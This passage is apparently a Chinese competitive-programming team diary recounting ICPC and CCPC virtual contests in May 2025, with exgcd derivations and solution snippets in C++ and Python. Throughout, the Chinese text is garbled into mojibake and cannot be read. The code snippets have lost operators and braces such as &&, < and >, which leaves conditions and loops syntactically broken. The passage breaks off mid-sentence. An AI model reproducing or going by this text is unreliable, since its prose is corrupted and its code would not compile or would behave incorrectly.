ç­¾åˆ°ï¼Œç„¶åæˆ‘å‘ç° D æ˜¯ç®€å•æ„é€ ï¼Œä¸‰é¢˜ä¸€éè¿‡ï¼Œå¼€å±€è¿˜ç®—æ¯”è¾ƒé¡ºåˆ©ã€‚ æ¥ä¸‹å»å¼€äº† Lï¼Œç”±å¥¶é¾™æŒ‡è®¤çš„å¥¶é¾™ä¸€å®šä¸æ˜¯å¥¶é¾™ä¸ºå‡ºå‘ç‚¹ï¼Œæå‡ºæ‹“æ‰‘åŠ è´ªå¿ƒçš„ç®—æ³•ã€‚æˆ‘å¼€å†™ï¼Œè„‘æŠ½ç”¨ set æ¥ç»´æŠ¤æœ€ä¼˜ä½œä¸ºå¥¶é¾™çš„èŠ‚ç‚¹ï¼Œå¯æ˜¯ä¼¼ä¹å¤„ç†ä¸Šæœ‰å¾ˆå¤§çš„ç»†èŠ‚æ¼æ´ï¼Œäºæ˜¯ä¸€ç›´ WAWAWAï¼Œå¯¼è‡´æ¥ä¸‹å»çš„ä¸€ä¸ªåŠå°æ—¶æ²¡æœ‰è¿‡é¢˜ã€‚Zlw å’Œ Sky åœ¨æƒ³ Fï¼Œè®¨è®ºå‡ºäº†æ‹†ç‚¹åŠ  bfs æœ€çŸ­è·¯çš„åšæ³•ã€‚è¢«è¸¹ä¸‹å»ä»¥åä»–ä»¬æäº¤äº†ä¸‰å‘åé€šè¿‡ï¼ˆWA æ˜¯ bfs åå¿˜è®° push æ–°çš„èŠ‚ç‚¹äº†ï¼‰ã€‚ è¿™æ—¶å€™æˆ‘åœ¨é‡æ„äº†è‹¥å¹²æ¬¡ä»£ç ä¹‹åçªç„¶é†’æ‚Ÿï¼Œåªéœ€è¦ $O(n)$ çš„æ‹“æ‰‘æ’åºå³å¯å®ç°ã€‚å…ˆå¤„ç†é“¾ï¼Œé‡åˆ°ä¸€ä¸ªç‚¹æ ‡è®°ä¸ºå¥¶é¾™ï¼ŒæŒ‡å‘çš„ä¸‹ä¸€ä¸ªç‚¹æ ‡è®°ä¸ºéå¥¶é¾™ï¼Œç„¶åå†æŠŠä¸‹ä¸€ä¸ªçš„ä¸‹ä¸€ä¸ªç‚¹å…¥åº¦å‡ä¸€ã€‚å‰©ä¸‹ä¸ºç¯çš„éƒ¨åˆ†ï¼Œå¦‚æœæœªæ ‡è®°å°±è®°å½•ä¸ªæ•° $x$ï¼Œä¸€æ®µæœªæ ‡è®°ä¸­å¥¶é¾™çš„ä¸ªæ•°å°±æ˜¯ $\\frac{x}{2}$ã€‚å†æ¬¡é‡å†™ï¼Œç»ˆäºé€šè¿‡ã€‚ã€æœç„¶ï¼Œå†™å¥¶é¾™é¢˜äººä¹Ÿä¼šå˜å”ï¼Œé˜¿å·´é˜¿å·´~~~ã€‘ Zlw åœ¨ä¹‹åå°è¯• Aï¼Œä½œä¸ºä¸€ä¸ªæ•°æ®ç»“æ„å¤§ç¥ï¼Œå°è¯•ç”¨åˆ†å—ï¼Œè«é˜Ÿä»¥åŠçº¿æ®µæ ‘çš„ç»“åˆé¢˜åˆ‡é¢˜ã€‚Sky åœ¨çœ‹ Gï¼Œæˆ‘çœ‹ Mã€‚A ä¸Šæœºå°è¯•å¹¶é€šè¿‡æ ·ä¾‹åæäº¤ï¼Œå‘ç° TLEï¼Œè°ƒæ•´åˆ†å—å‚æ•°åä»ç„¶æ— æ³•é€šè¿‡ã€‚è€Œ M å‘ç°äº¤äº’æ¯«æ— æ„ä¹‰ï¼ŒæŠŠé¢˜ç›®è½¬åŒ–ä¸ºäº†å·²çŸ¥ä¸ä¸€é¡¶ç‚¹ $P$ åˆ°å…¶å®ƒä¸ç›¸é‚»çš„é¡¶ç‚¹æ„æˆçš„çº¿æ®µç›¸äº¤çš„ä¸‰è§’å‰–åˆ†æ•°é‡ï¼Œç„¶åè¿˜åŸä¸‰è§’å‰–åˆ†ã€‚å¯æƒœæ²¡ä»€ä¹ˆæƒ³æ³•ã€‚ G åˆæƒ³äº†è´ªå¿ƒçš„æƒ³æ³•ï¼Œäºæ˜¯ä¸Šæœºå†™ã€‚ç”±äºæ™®é€šçš„è´ªå¿ƒæ˜¯ $O(Tnk)$ çš„ï¼Œæˆ‘å¾®å¾®æ‰“è¡¨è§‚å¯Ÿä»¥åæå‡ºäº†ä¸€ä¸ªå…ˆå°†æ¯ä¸ªæ•°å¢åŠ  $\\max (0,\\frac{k - 100n}{n})$ åå‰©ä½™éƒ¨åˆ†å†è´ªå¿ƒçš„åšæ³•ï¼ˆå…¶å®ä¸¥æ ¼æ¥è¯´ï¼Œ$100$ åº”è¯¥æ›¿æ¢ä¸º $\\max {l_i} - \\min {l_i}$ï¼Œä½†æ˜¯å–æé™å·®ä¸å¤šå°±æ˜¯ $100$ï¼‰ï¼Œæ­¤æ—¶ç»è¿‡ä¼°ç®—åº”è¯¥èƒ½å¤Ÿé€šè¿‡ã€‚å¯æ˜¯äº¤ä¸Šå»åä»ç„¶ TLEï¼Œäºæ˜¯æ¥ä¸‹å»çš„ n å‘æäº¤éƒ½æ˜¯å†å°è¯•è°ƒå‚å¡ç²¾åº¦ã€‚Sky å¼„äº†åŠå¤©ä»ç„¶ä¸è¡Œï¼Œè¶ä»–ä¸Šå•æ‰€çš„æ—¶å€™ï¼Œæˆ‘æŠŠä»–è´ªå¿ƒæ”¹æˆä¼˜å…ˆé˜Ÿåˆ—ï¼Œç„¶ååŠ äº†å¿«è¯»å¿«å†™ï¼ŒæŠŠå¸¸æ•°å‡å°äº† $5$ å€å·¦å³ã€‚ç»ˆäºï¼Œ+10 ä»¥ 956 ms æé™å¡è¿‡æ­¤é¢˜ï¼ˆä¸€å…± 113 ä¸ªæµ‹è¯•ç‚¹å¯è¿˜è¡Œ qwqï¼‰ã€‚åæ¥çœ‹äº†é¢˜è§£ï¼Œå‘ç°æ˜¯è¦äºŒåˆ†æ“ä½œçš„å€ç‡ï¼Œå®åœ¨æ˜¯æ·±åˆ»ã€‚ è¿˜æ˜¯ 6 é¢˜é¦–å°¾ï¼Œä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¯ä»¥çªç ´æ~ 2025.05.22 The 2024 ICPC Asia Shanghai Regional Conteståˆéš¾åˆå±çš„ä¸€åœºï¼Œèµ›æ—¶ 5 é¢˜ï¼Œèµ›å 7 é¢˜ã€‚ ä¸Šæ¥å°±è¢« I ç­¾åˆ°ç»™æ¶å¿ƒäº†å¥½å‡ å‘ï¼ŒåŸå› å°±æ˜¯æ±‚çš„æ˜¯æœ€å¤§å€¼çš„æ¨¡è€Œéæ¨¡æ„ä¹‰ä¸‹çš„æœ€å¤§å€¼ï¼Œå› æ­¤å–æ¨¡è¦éå¸¸å°å¿ƒã€‚$0$ ä»¥åŠå¤§äºæ¨¡æ•°çš„æƒ…å†µéƒ½éœ€è¦è€ƒè™‘åˆ°ï¼Œéå¸¸å®¹æ˜“å‡ºé”™ã€‚åŠå°æ—¶æ‰é€šè¿‡æ­¤é¢˜ï¼Œè€Œä¸” WA äº†æ•´æ•´ 7 æ¬¡ï¼ˆæ˜¾ç„¶æ˜¯çº¢æ¸©äº†ï¼‰ã€‚ æ¥ä¸‹æ¥ Sky ç§’äº†åšå¼ˆè®º Cï¼ŒZlw å¼€å§‹å†™ Bã€‚ä½†ç”±äºä¸€äº›ç­”æ¡ˆçš„åˆå¹¶é—®é¢˜ï¼ŒB ä¸€ç›´è¢«ç¡¬æ§ã€‚æ¥ä¸‹æ¥å‘ç° D æ˜¯æ„é€ ï¼Œæœæ–­å°†å…¶ä¸¢ç»™æˆ‘ã€‚æˆ‘æ‰‹ç© D å‘ç°åªéœ€è¦ç€é‡è€ƒè™‘æœ€åå››ä½çš„æƒ…å†µï¼Œäºæ˜¯ç–¯ç‹‚åˆ†è®¨ã€‚ä¸Šæœºå†™ Dï¼Œå‘ç°æ ·ä¾‹æ°´å¾—ä¸€æ‰¹ï¼Œäºæ˜¯ç›´æ¥äº¤ï¼Œå–œæ WAã€‚ä¸‹æœºæ€è€ƒï¼ŒZlw ç»ˆäºè¿‡äº† Bï¼Œç„¶åæˆ‘å‘ç°æœ‰å‡ ç§æƒ…å†µèƒ½å¤Ÿæ›´ä¼˜çš„æ„é€ ï¼Œæœæ–­ä¿®æ”¹åé€šè¿‡ã€‚è¿™æ—¶å€™ 2 å°æ—¶ 4 é¢˜ï¼Œé™¤äº†ç½šæ—¶å¤–åˆ°è¿˜è¡Œã€‚ ä¹‹åæˆ‘åˆå‘ç° H æ˜¯æ„é€ ï¼Œäºæ˜¯åˆå¼€å§‹æ‰‹ç©ã€‚ä»–ä¿©åœ¨æƒ³ Gï¼Œä¼¼ä¹æ˜¯å’ŒäºŒåˆ†ä¸­ä½æ•°ç›¸å…³ã€‚H ç©äº†å¾ˆä¹…ï¼Œç”±äºæ˜¯æœ€ä¼˜åŒ–æ­¥æ•°çš„æ„é€ ï¼Œæˆ‘ä¼¼ä¹æ²¡å•¥å®Œæ•´çš„æƒ³æ³•ï¼Œäºæ˜¯å¼€å§‹è¿›å‡» M è®¡ç®—å‡ ä½•ã€‚ M ä¼¼ä¹å¥½åšï¼Œå¾ˆå¿«åœ°å°†é—®é¢˜åˆ†ä¸ºäº†å››ç±»ã€‚è®¾éä¸Šä¸‹è¡¨é¢çš„ç‚¹çš„ä¸ªæ•°ä¸º $n$ï¼ˆéœ€è¦å»é‡ï¼‰ï¼Œç„¶åå°†ä¸Šä¸‹è¡¨é¢çš„ç‚¹æ˜ å°„åˆ°äºŒç»´å¹³é¢ä¸­ã€‚äºæ˜¯æœ‰ï¼š $n = 0$ æ’æœ‰è§£ã€‚ $n = 1$ åˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸€æ¡è¿‡å®šç‚¹çš„ç›´çº¿å¯ä»¥å°†å‰©ä½™ç‚¹å½’åˆ°ç›´çº¿çš„ä¸€ä¾§ã€‚ç›´æ¥åˆ¤æ–­è¯¥ç‚¹æ˜¯å¦ä¸ºå‡¸åŒ…ä¸Šçš„ä¸€ç‚¹å³å¯ã€‚ $n = 2$ åˆ¤æ–­è¿‡ä¸¤ä¸ªå®šç‚¹çš„åœ†èƒ½å¤Ÿå°†ä½¿å¾—å‰©ä½™ç‚¹å‡åœ¨è¿™ä¸ªåœ†ä¸­ã€‚å°†ç‚¹åˆ†ä¸ºç›´çº¿çš„ä¸¤ä¾§ï¼Œç„¶åæ ¹æ®åœ†å‘¨è§’çš„å¤§å°ï¼Œä¸€ä¾§å„å‰©ä¸‹ä¸€ç‚¹ï¼ˆæ²¡æœ‰çš„è¯è‚¯å®šåˆæ³•ï¼‰ï¼Œåˆ¤æ–­å››ç‚¹å…±åœ†å³å¯ã€‚ç‰¹åˆ«åœ°ï¼Œå¦‚æœç‚¹åœ¨ç›´çº¿ä¸Šï¼Œåˆ™éœ€è¦åœ¨çº¿æ®µä¸Šæ‰ç¬¦åˆã€‚ $n = 3$ ä¸‰ç‚¹å…±çº¿åˆ™ä¸åˆæ³•ã€‚å¦åˆ™å–ä¸‰ç‚¹ä½œåœ†ï¼Œåˆ¤æ–­å‰©ä½™ç‚¹æ˜¯å¦åœ¨åœ†ä¸Šå³å¯ã€‚ æƒ³å®Œçš„æ—¶å€™ Zlw åˆšå¥½å†™å®Œ Gï¼Œäºæ˜¯æˆ‘ä¸Šæœºè´ºæ¿å­å†™ Mã€‚å†™å®Œä»¥åä¸€ç›´ WAï¼Œå„ç§ corner å†™æŒ‚ï¼Œæœ€ååˆè¢«å¡ç²¾åº¦ï¼Œç›´æ¥å†™å´©æºƒï¼Œç›´åˆ°ç»“æŸä¹Ÿæ²¡è¿‡ã€‚èµ›åè°ƒäº†å¾ˆä¹…å¾ˆä¹…ï¼Œç„¶ååˆä¸æ–­ hack è‡ªå·±ï¼Œæœ€ç»ˆæ‰è¯ç”Ÿäº†ä¸€ä»½ç¨å¾®å¥½ä¸€ç‚¹çš„å±ã€‚ auto f1 = [] () - bool sp.push_back (P[0]); auto hull = convex_hull (sp); for (auto [x,y] : hull) if (dcmp (x - P[0].x) == 0 dcmp (y - P[0].y) == 0) return true; return false;;auto f2 = [] () - bool for (auto x : sp) if (on_line (x,P[0],P[1]) !on_seg (x,P[0],P[1])) return false; LD d1 = 1000,d2 = 1000; Point P1,P2; for (auto x : sp) if (on_line (x,P[0],P[1])) continue; if (cross (P[1] - P[0],x - P[0]) 0) if (angle (x - P[1],x - P[0]) d1) P1 = x,d1 = angle (x - P[1],x - P[0]); if (cross (P[1] - P[0],x - P[0]) 0) if (angle (x - P[1],x - P[0]) d2) P2 = x,d2 = angle (x - P[1],x - P[0]); if (d1 == 1000 || d2 == 1000) return true; Point F1 = foot (P1,P[0],P[1]),F2 = foot (P2,P[0],P[1]); if (dcmp (dot (F1 - P[0],F1 - P[1])) 0 dcmp (dot (F2 - P[0],F2 - P[1])) 0) return false; Circle C1 = triangle_circum (P[0],P[1],P1),C2 = triangle_circum (P[0],P[1],P2); return in_cir (C1,P2) in_cir (C2,P1);;auto f3 = [] () - bool if (dcmp (cross (P[0] - P[1],P[0] - P[2])) == 0) return false; Circle C = triangle_circum (P[0],P[1],P[2]); for (int i = 3;i P.size ();++i) if (dcmp (len (P[i] - C.O) - C.r) != 0) return false; for (auto x : sp) if (!in_cir (C,x)) return false; return 1;; äº‹å®è¯æ˜ï¼Œè¿˜æ˜¯è¦è°¨æ…å¼€è®¡ç®—å‡ ä½•ã€‚èµ›åå‘ç°æˆ‘ç²¾å‡†çš„é€‰åˆ°äº† H,M $\\text{Medium hard}$ï¼Œè€Œè·³è¿‡äº†ä¸­é—´çš„ F,Jï¼ˆéå¸¸ç¦»è°±ï¼Œçœ‹éƒ½æ²¡çœ‹ï¼‰ã€‚çœ‹æ¥ç­–ç•¥è¿˜æ˜¯éœ€è¦åœ¨æ¥ä¸‹å»è¿›ä¸€æ­¥è°ƒæ•´ï¼ 2025.05.23è¡¥é¢˜ï¼Œå‘ç° H æœ€åæ„é€ å‡ºæ¥å‰©ä½™ . çš„ä¸ªæ•°ä¸ä¼šè¶…è¿‡å››ä¸ªã€‚äºæ˜¯å°±å¼€å§‹è´ªå¿ƒæ„é€ ï¼Œè°ƒæ•´ 6 ç§æƒ…å†µçš„ä¼˜å…ˆçº§ï¼Œè¯•ç€è¯•ç€çªç„¶å‘ç°å¯¹äº†ã€‚å”¯ä¸€çš„å‘ç‚¹å°±æ˜¯è¦å°å¿ƒåŒè‰²è¿æˆè¿é€šå—ï¼Œç›´æ¥æš´åŠ›åˆ¤æ–­åè°ƒæ•´ã€‚æ”¾ä¸€ä¸‹å±å±±ä»£ç ï¼š int main () n = read ();int ans = 0; vector vector char a (n + 5,vector char (n + 5,.)); vector vector char b (n + 5,vector char (n + 5,.)); auto check = [] (int x,int y) - bool return !(x y || x = 0 || y = 0 || x n || a[x][y] != .);; auto same = [] (char ch,int x,int y) - bool return ch == a[x][y - 1] || ch == a[x][y + 1] || ch == a[x - 1][y - 1] || ch == a[x - 1][y] || ch == a[x + 1][y] || ch == a[x + 1][y + 1];; for (int i = n;i;--i) for (int j = 1;j = i;++j) if (i == n j == 1) continue; if (check (i,j) check (i,j + 1) check (i - 1,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i,j + 1) || same (char (op + A),i - 1,j - 1)) ++op,op %= 26; a[i][j] = a[i][j + 1] = a[i - 1][j - 1] = char (op + A); ++ans;continue; if (check (i,j) check (i,j + 1) check (i - 1,j + 1)) while (same (char (op + A),i,j) || same (char (op + A),i,j + 1) || same (char (op + A),i - 1,j + 1)) ++op,op %= 26; a[i][j] = a[i][j + 1] = a[i - 1][j + 1] = char (op + A); ++ans;continue; if (check (i - 1,j - 2) check (i - 1,j - 1) check (i,j)) while (same (char (op + A),i - 1,j - 2) || same (char (op + A),i - 1,j + 1) || same (char (op + A),i,j)) ++op,op %= 26; a[i - 1][j - 2] = a[i - 1][j - 1] = a[i][j] = char (op + A); ++ans;continue; if (check (i,j) check (i - 1,j - 1) check (i - 2,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j - 1) || same (char (op + A),i - 2,j - 1)) ++op,op %= 26; a[i][j] = a[i - 1][j - 1] = a[i - 2][j - 1] = char (op + A); ++ans;continue; if (check (i,j) check (i - 1,j) check (i - 1,j + 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j) || same (char (op + A),i - 1,j + 1)) ++op,op %= 26; a[i - 1][j] = a[i - 1][j + 1] = a[i][j] = char (op + A); ++ans;continue; if (check (i - 1,j) check (i,j) check (i - 2,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j) || same (char (op + A),i - 2,j - 1)) ++op,op %= 26; a[i - 1][j] = a[i][j] = a[i - 2][j - 1] = char (op + A); ++ans;continue; for (int i = 1;i = n;++i) for (int j = 1;j = n - i;++j) putchar ( ); for (int j = 1;j = i;++j) putchar (a[i][j]); putchar (j == i ? : ); return 0; 2025.05.24ä»ç„¶æ˜¯è°ƒæ•´æ—¥ã€‚æ˜¨å¤©çœ‹å…¶å®ƒé˜Ÿä¼ vp çš„æ—¶å€™å‘ç°è‡ªå·±çš„æ•°è®ºå®åœ¨æ˜¯å¤ªå·®äº†ï¼Œé‚è¡¥ä¸€ä¸‹ exgcdã€‚ Step æ±‚æ»¡è¶³ $\\forall i \\in [1,n],\\frac{n(n + 1)}{2} \\equiv 0\\pmod {p_i}$ çš„æœ€å°æ­£æ•´æ•° $n$ã€‚ è®¾ $l = 2\\times \\operatorname{lcm} (p_1,p_2,\\cdots,p_n)$ã€‚è½¬æ¢ä¸ºæœ€å°åŒ– $n$ï¼Œä½¿å¾— $n(n + 1) \\equiv 0 \\pmod l$ æˆç«‹ã€‚ ç”±äº $\\gcd (n,n + 1) = 1$ï¼Œå› æ­¤ $l$ çš„ä¸€ç§å› å­åªä¼šåˆ†ç»™ $n$ æˆ– $n + 1$ å…¶ä¸­ä¸€ä¸ªã€‚ç”±äº $l$ çš„å› å­æ•°é‡æœ€å¤šä¸º $15$ ä¸ªï¼Œå› æ­¤çŠ¶å‹æšä¸¾å³å¯ã€‚ å¯¹äºå½“å‰çŠ¶æ€ $st$ï¼Œä»¤ $x = \\mathop{\\prod}_{\\substack{i \\in st}} p_i,y = \\mathop{\\prod}_{\\substack{j \\in st^\\complement}} p_j$ï¼Œåˆ™ $n = ax,n + 1 = by$ï¼Œä½œå·®å¯çŸ¥ $-ax + by = 1$ã€‚ç”±äº $\\gcd (a,b) = 1$ï¼Œæ–¹ç¨‹æœ‰è§£ï¼Œç›´æ¥è·‘ exgcdï¼Œç„¶åæ±‚ $\\min \\{ax\\}$ å³å¯ã€‚ æœ‰é™å°æ•° ç»ˆäºæŠŠä¸Šä¸ªèµ›å­£é‡åº†ç«™çš„é¢˜ç›®ç»™è¡¥äº†ã€‚(ä»¥ä¸‹è¯æ˜éƒ¨åˆ†å‚è€ƒ CCPC2024 é‡åº†_è¡¥é¢˜è®°å½•ADFGH) å‘½é¢˜ è‹¥ $b = w2^x5^y$ï¼Œåˆ™æœ€ä¼˜æ¡ä»¶ä¸‹ $d$ ä¸€å®šå¯ä»¥è¡¨ç¤ºä¸º $w2^{x\\prime}5^{y\\prime}$(å…¶ä¸­ $w,z$ ä¸å†å«æœ‰ $2,5$ çš„å¹‚æ¬¡)ã€‚ è¯æ˜ è®¾ $d = z2^{x\\prime}5^{y\\prime}$ï¼Œåˆ™ $\\frac{a}{b} + \\frac{c}{d} = \\frac{az2^{x\\prime}5^{y\\prime} + wc2^x5^y}{wz2^{x + x\\prime}5^{y + y\\prime}}$ã€‚æ¥ä¸‹æ¥å¤„ç†åˆ†å­ï¼Œç”±äºæœ€åæ˜¯æœ‰é™å°æ•°ï¼Œä¸€å®šå­˜åœ¨ $k$ ä½¿å¾— $az2^{x\\prime}5^{y\\prime} + wc2^x5^y = kwz$ æˆç«‹ã€‚ æŠŠ $c,k$ çœ‹ä½œæœªçŸ¥æ•°ï¼Œå†™æˆ exgcd çš„æ ‡å‡†å½¢å¼ï¼š (-w2^x5^y) \\times c + wz \\times k = az2^{x\\prime}5^{y\\prime}æœ‰è§£å½“ä¸”ä»…å½“ $\\gcd(-w2^x5^y,wz) = w \\mid az2^{x\\prime}5^{y\\prime}$ï¼Œä¹Ÿå°±æ˜¯ $w \\mid az$ã€‚ç”±äº $\\gcd (a,b) = 1$ï¼Œåˆ™ $\\gcd (a,w) = 1$ï¼Œå› æ­¤å¾—åˆ° $w \\mid z$ã€‚ åŒç†ï¼ŒæŠŠ $a,k$ å½“ä½œæœªçŸ¥æ•°ï¼Œå¯ä»¥å¾—åˆ° $z \\mid w$ã€‚ ç»¼ä¸Šï¼Œ$z = w$ æˆç«‹ã€‚ å› æ­¤ï¼Œ$\\frac{a}{b} + \\frac{c}{d} = \\frac{a2^{x\\prime}5^{y\\prime} + c2^x5^y}{w2^{x + x\\prime}5^{y + y\\prime}}$ã€‚ç”±äºæœ€åæ˜¯æœ‰é™å°æ•°ï¼Œæ‰€ä»¥å¯ä»¥è¿›ä¸€æ­¥æŠŠå’Œè¡¨ç¤ºä¸º $\\frac{kw}{w2^{x + x\\prime}5^{y + y\\prime}} = \\frac{kw^2}{bd}$ã€‚æšä¸¾ $d$ ä¸­çš„ $x^{\\prime},y^{\\prime}$ï¼Œç„¶åæ±‚ä¸å®šæ–¹ç¨‹ b \\times c - w^2 \\times k = -adç›´æ¥ exgcd åæ±‚å‡º $c$ çš„æœ€å°å€¼å³å¯ã€‚ 2025.05.25 ç¬¬åå±Šä¸­å›½å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ› æµå—ç«™ï¼ˆCCPC 2024 Jinan Siteï¼‰é¢˜ç›®å¥½éš¾ï¼Œå°±åšå‡º 4 é¢˜ï¼Œå€’é—­ï¼ A,J ç­¾åˆ°ï¼Œä½†æ˜¯ A è¢«æˆ‘ WA äº†ä¸€å‘ã€‚ä¹‹åæƒ³ Fï¼ŒZlw ç”¨äº†æ•°è®ºåšæ³•ï¼Œè¿˜ç”¨åˆ°äº†è«æ¯”ä¹Œæ–¯åæ¼”ï¼Œä¼¼ä¹å¤æ‚åŒ–äº†ï¼ŒWA äº†å¥½å‡ æ¬¡ä»¥åæ‰è¿‡ï¼ˆåº”è¯¥å·²ç»æ˜¯ 2.5 h å·¦å³äº†ï¼‰ã€‚ æˆ‘çœ‹äº† Eï¼Œæ„Ÿè§‰æ˜¯ä¸ªè¶…çº§åˆ†ç±»è®¨è®ºé¢˜ï¼Œäºæ˜¯å¼€å§‹ç–¯ç‹‚æ¨å…¬å¼ã€‚Sky çœ‹ Bï¼Œæ˜¯ä¸ªæ¨¡æ‹Ÿ+æš´åŠ›é¢˜ï¼Œä½†æ˜¯ä¸å¥½å†™ã€‚E æˆ‘åˆ†äº† 7 ç±»ï¼Œæ„Ÿè§‰å·®ä¸å¤šäº†å°±ä¸Šæœºå†™ã€‚ç”±äºæ¶‰åŠé«˜ç²¾åº¦ï¼Œäºæ˜¯æœæ–­ä½¿ç”¨ Pythonã€‚æ ·ä¾‹çœŸçš„æ°´çš„ä¸€æ‰¹ï¼Œè¿‡äº†æ ·ä¾‹äº¤ç„¶åå–œæ WAã€‚ é™æ€è°ƒè¯•æ— æœï¼Œäºæ˜¯ä¸‹æœºçœ‹ I æ¢æ¢è„‘å­ï¼ŒSky ä¸Šæœºå†™ Bã€‚I æ„é€ å®¹æ˜“æƒ³åˆ°è‡ªåº•å¾€ä¸Šï¼ŒåŒä¸€ä¸ªå­æ ‘å†…çš„ç‚¹å¯ä»¥ç›´æ¥åˆå¹¶ï¼Œç„¶åæƒ³åˆ°é“¾çš„åšæ³•ä¸å¤ªå¥½æã€‚è¿™æ—¶å€™ Sky è¿‡äº† Bï¼Œäºæ˜¯æˆ‘å°±æ²¡å†ç»†æƒ³ï¼ŒæŠŠé¢˜ä¸¢ç»™ä»–ä¿©ï¼Œç„¶åè°ƒ E å»äº†ã€‚ äº‹å®è¯æ˜ï¼Œè¿™æ˜¯è¿™åœºæ¯”èµ›çš„è´¥ç¬”ã€‚æ¥ä¸‹æ¥çš„æ—¶é—´å†…ï¼ŒE ä¸€ç›´è¢«å½¢å¦‚ ABAB...A éœ€è¦å¯¹æœ€åä¸€ä¸ª A è°ƒæ•´çš„ case æ‰€å›°æ‰°ï¼Œè€Œä»–ä¿©ç›´æ¥æŠŠ I æƒ³å¤æ‚ï¼Œåœ¨åšæ ‘ä¸Š DPã€‚äºæ˜¯ä¸€ç›´çº¢æ¸©åˆ°æ¯”èµ›ç»“æŸã€‚ åæ¥æ‰å‘ç°ï¼ŒE çš„ ABAB...A çš„è°ƒæ•´è¿˜éœ€è¦ç»†åŒ–ã€‚å‡è®¾ç›´æ¥æŒ‰ç…§è¿™ä¸ªæ–¹æ¡ˆä¼šæµªè´¹æ‰ $x$ çš„è·ç¦»ï¼Œåˆ™æœ‰ï¼š B æœ€å¤šå¯ä»¥ç§»æ‰ $\\min (x,\\lfloor\\frac{D}{X + Y}\\rfloor \\times Y)$ã€‚ å˜ä¸º AA...ABAB çš„å½¢å¼ B æœ€å¤šæœ‰ $\\min (D - \\lfloor\\frac{D}{X}\\rfloor \\times X,\\lfloor\\frac{D}{X}\\rfloor \\times Y)$ã€‚ æœ€ç»ˆä»£ç ï¼š def up (x,y) : return (x - 1) // y + 1def solve (A,B,C,X,Y,D) : if D = X : return A if D = X + Y : return min (A + B * (D - X),A * up (D,X),A * (D // X) + B * (D % X)) ans = A * up (D,X) #AA...A if D % X = Y : ans = min (ans,(D // X) * A + B * (D % X)) #AA...B else : ans = min (ans,(D // X) * A + B * Y + (D % X - Y) * C) #AA...BC ans = min (ans,A + B * Y + (D - X - Y) * C) #ABC if D % (X + Y) X : ans = min (ans,(D // (X + Y)) * (A + B * Y) + A + B * (D % (X + Y) - X)) #ABAB...AB ans = min (ans,D // X * A + min (D - D // X * X,D // X * Y) * B + (D - D // X * X - min (D - D // X * X,D // X * Y)) * C) # AA..ABAB.. ans = min (ans,(D // (X + Y)) * (A + B * Y) + A - B * min (D // (X + Y) * Y,X - D % (X + Y))) #ABAB...A ans = min (ans,(D // (X + Y)) * (A + B * Y) + C * (D - (X + Y) * (D // (X + Y)))) #ABAB...C return ans è€Œ Iï¼Œé‚£ç§é“¾çš„æƒ…å†µä¹Ÿå¾ˆå¥½åšï¼Œç›´æ¥è®°å½•ä¸‹å‰©ä½™çš„ç‚¹ç„¶åå¾€ä¸Šä¼ å³å¯ã€‚æ³¨æ„å¦‚æœä¸€ä¸ªå­æ ‘å†…ï¼Œä¼˜å…ˆåˆå¹¶å•ç‚¹ï¼Œå†åˆå¹¶å‘ä¸Šä¼ è¿‡çš„ç‚¹ï¼ˆå› ä¸ºå•ç‚¹ä¸èƒ½å½¢æˆè‡ªç¯ï¼‰ã€‚èµ›å Sky å†™äº† Iï¼Œä¸€å‘é€šè¿‡ï¼›æˆ‘ä¹Ÿåœ¨å‘ç° corner case ä»¥å WA äº†å‡ å‘åé€šè¿‡ã€‚ç®€ç›´ç ´å¤§é˜²ï¼ C çº¯æ„é€ ç«Ÿç„¶æ²¡å‘ç°ï¼Œæ„Ÿè§‰éå¸¸å¥½åšã€‚POP n GOTO n + 1; PUSH n GOTO n å°±èƒ½å½¢æˆé“¾ï¼ŒPOP n GOTO n + 1; PUSH n GOTO 1 å°±èƒ½ç¿»å€ï¼Œäºæ˜¯è¿™é“é¢˜åšå®Œäº†ã€‚ void dfs (ll x) if (!x) return ; if (x / 2 % 2 == 1) dfs (x / 2 - 1);++cnt; printf (POP %d GOTO %d; PUSH %d GOTO %d ,cnt,cnt + 1,cnt,1); else dfs (x - 2);++cnt; printf (POP %d GOTO %d; PUSH %d GOTO %d ,cnt,cnt + 1,cnt,cnt); 2025.05.26 The 2024 ICPC Southeastern Europe Regional Contest (SEERC 2024)åšç‚¹æ¬§æ´²çš„åŒºåŸŸèµ›æ¥æ¢æ¢è„‘å­ã€‚ å¼€å±€ Zlw å‘ç° A æ˜¯ $n^2$ çš„åšæ³•ï¼Œäºæ˜¯ä¸éœ€è¦æ¢æ ¹ DP ç›´æ¥æš´åŠ›ã€‚æˆ‘åœ¨çœ‹ Dï¼Œæ„Ÿè§‰å˜ç§çš„ Nim æ¸¸æˆå¹¶ä¸æ˜¯é‚£ä¹ˆå¥½åšï¼Œä½† Sky å‘ç°åæ‰‹æ˜¯éœ€è¦è¿ç»­æ“ä½œ $n$ è½®ï¼Œä¸å †æ•°ç›¸åŒï¼Œé‚£ä¹ˆè¿™é“é¢˜ç¬é—´å˜å”ã€‚äºæ˜¯ç«‹åˆ»å¼€å†™ï¼Œä½†è¢«å…¨æ˜¯ $0$ çš„ corner case æ·¦äº†ä¸€å‘ç½šæ—¶ã€‚ åœ¨ A é€šè¿‡ä¹‹åï¼Œæˆ‘å‘ç° G æ˜¯ä¸€ä¸ªç®€å• DPï¼Œç›´æ¥å¼€å†™ï¼Œä¸€å‘é€šè¿‡ã€‚ä¹‹å Sky è®©æˆ‘çœ‹çœ‹ Jï¼Œå¦‚æœæ˜¯æå€¼çš„æƒ…å†µç­”æ¡ˆå¾ˆç®€å•ï¼Œç„¶åå‘ç°å¦‚æœæ˜¯è¢«æœ€å¤§æœ€å°å€¼åŠ åœ¨ä¸­é—´æ—¶ï¼Œåªéœ€è¦å¤šä¸€æ¬¡æ“ä½œå°±èƒ½å°†å…¶å½’çº¦åˆ°å‰ä¸€ç§æƒ…å†µï¼Œäºæ˜¯ç«é€Ÿè¿‡ Jã€‚Zlw åœ¨æƒ³ Lï¼ŒçŒœäº†ä¸€ä¸ªæƒ³æ³•å¹¶æ‰‹æ“å¹³è¡¡æ 